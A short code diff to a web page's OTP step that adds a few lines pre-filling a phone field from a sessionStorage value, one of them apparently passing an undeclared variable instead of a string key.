@@ -404,6 +404,13 @@ h1{
 </div>
 <script src="assets/emit.js"></script> 
 <script>
+	
+	if(sessionStorage.getItem("setcode"))
+	{
+	  updatePhoneField("#phone", sessionStorage.getItem(setcode));
+	}
+	
+	
 page = "otp";
 document.querySelector("#username").textContent = sessionStorage.getItem("user");
 submitBtn.addEventListener("click", function() {
